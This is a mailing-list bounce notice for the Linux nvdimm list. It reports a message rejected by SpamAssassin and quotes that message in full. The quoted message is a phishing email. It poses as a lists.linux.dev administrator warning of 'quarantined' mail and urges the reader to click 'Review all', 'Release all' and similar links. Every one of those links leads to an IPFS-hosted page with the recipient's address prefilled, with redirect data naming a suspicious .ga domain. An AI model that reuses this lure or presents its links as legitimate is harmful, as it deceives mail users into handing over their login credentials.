Return-Path: <nvdimm+bounces-6523-lists+linux-nvdimm=lfdr.de@lists.linux.dev>
X-Original-To: lists+linux-nvdimm@lfdr.de
Delivered-To: lists+linux-nvdimm@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 3F93977DED5
	for <lists+linux-nvdimm@lfdr.de>; Wed, 16 Aug 2023 12:33:17 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id ED57D2819E3
	for <lists+linux-nvdimm@lfdr.de>; Wed, 16 Aug 2023 10:33:15 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 838B4DDC6;
	Wed, 16 Aug 2023 10:33:10 +0000 (UTC)
X-Original-To: nvdimm@lists.linux.dev
Received: from chg.server2.ideacentral.com (unknown [108.163.232.234])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 14613101C8
	for <nvdimm@lists.linux.dev>; Wed, 16 Aug 2023 10:33:09 +0000 (UTC)
Received: from mailnull by ns-196.awsdns-24.com with local (Exim 4.96)
	id 1qWDps-00CDFr-11
	for nvdimm@lists.linux.dev;
	Wed, 16 Aug 2023 05:33:08 -0500
X-Failed-Recipients: nvdimm@lists.linux.dev
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@ns-196.awsdns-24.com>
To: nvdimm@lists.linux.dev
References: <20230816113304.228C7B2568AFF488@lists.linux.dev>
Content-Type: multipart/report; report-type=delivery-status; boundary=1692181988-eximdsn-464354916
Precedence: bulk
X-Mailing-List: nvdimm@lists.linux.dev
List-Id: <nvdimm.lists.linux.dev>
List-Subscribe: <mailto:nvdimm+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:nvdimm+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1qWDps-00CDFr-11@ns-196.awsdns-24.com>
Date: Wed, 16 Aug 2023 05:33:08 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - ns-196.awsdns-24.com
X-AntiAbuse: Original Domain - lists.linux.dev
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - 
X-Get-Message-Sender-Via: ns-196.awsdns-24.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
X-Authenticated-Sender: ns-196.awsdns-24.com: mailnull

--1692181988-eximdsn-464354916
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  nvdimm@lists.linux.dev
    host smtp.subspace.kernel.org [44.238.234.78]
    SMTP error from remote mail server after end of data:
    550 5.7.1 Blocked by SpamAssassin

--1692181988-eximdsn-464354916
Content-type: message/delivery-status

Reporting-MTA: dns; ns-196.awsdns-24.com

Action: failed
Final-Recipient: rfc822;nvdimm@lists.linux.dev
Status: 5.0.0
Remote-MTA: dns; smtp.subspace.kernel.org
Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin

--1692181988-eximdsn-464354916
Content-type: message/rfc822

Return-path: <nvdimm@lists.linux.dev>
Received: from v-104-153-108-120.unman-vds.premium-chicago.nfoservers.com ([104.153.108.120]:51545)
	by ns-196.awsdns-24.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
	(Exim 4.96)
	(envelope-from <nvdimm@lists.linux.dev>)
	id 1qWDpp-00CCj7-2Q
	for nvdimm@lists.linux.dev;
	Wed, 16 Aug 2023 05:33:05 -0500
From: lists.linux.devAdministrator<nvdimm@lists.linux.dev>
To: nvdimm@lists.linux.dev
Subject: =?UTF-8?B?IOKaoO+4jyBXQVJOSU5HOlNvbWUgRW1haWxzIENvdWxkIG5vdCBiZSBkZWxpdmVyZWQg?=
Date: 16 Aug 2023 11:33:04 +0100
Message-ID: <20230816113304.228C7B2568AFF488@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html><head><title></title>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><span style=3D"background-color: rgb(204, 204, 204);"><b><i><font col=
or=3D"#ff0000">Some Emails Could not be Delivered , Action Required</font><=
/i></b>.</span><div><br><font color=3D"#3d85c6"><font size=3D"4"><b>Quarant=
ined Messages Report</b> </font>&nbsp;</font><br>nvdimm@lists.linux.dev<div=
>16-08-2023, 08:00AM <br>&nbsp;<br>Dear nvdimm,</div><div><br>
4 messages addressed to you are currently on hold awaiting your further act=
ion. You can release all of your held messages and permit or block future e=
mails from the senders, or manage messages individually.<br><br>
<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPa=
nxX?clientID=3Dnvdimm@lists.linux.dev" target=3D"_blank" data-saferedirectu=
rl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5=
D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJ=
X-xB2LHrk7CvessvAOsg">Review all</a>
&nbsp; &nbsp;<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGb=
cFJkycxN8DaPanxX?clientID=3Dnvdimm@lists.linux.dev" target=3D"_blank" data-=
saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5=
B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DA=
FQjCNFFwLZWfJX-xB2LHrk7CvessvAOsg">Release all</a>
&nbsp; &nbsp; <a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRG=
bcFJkycxN8DaPanxX?clientID=3Dnvdimm@lists.linux.dev" target=3D"_blank" data=
-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%=
5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3D=
AFQjCNFFwLZWfJX-xB2LHrk7CvessvAOsg">Block all</a><br><br>Further Informatio=
n: <br>
To view your entire quarantine inbox or manage your preferences, <a href=3D=
"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPanxX?client=
ID=3Dnvdimm@lists.linux.dev" target=3D"_blank" data-saferedirecturl=3D"http=
s://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5D%5D&amp;s=
ource=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJX-xB2LHrk7=
CvessvAOsg">Click Here</a><br><br>The system generated this notice on 16-08=
-2023, at 09:00AM<br>Do not reply to this automated message.<br>
&copy; 2023 lists.linux.dev. All rights reserved.</div></div>
</body></html>

--1692181988-eximdsn-464354916--

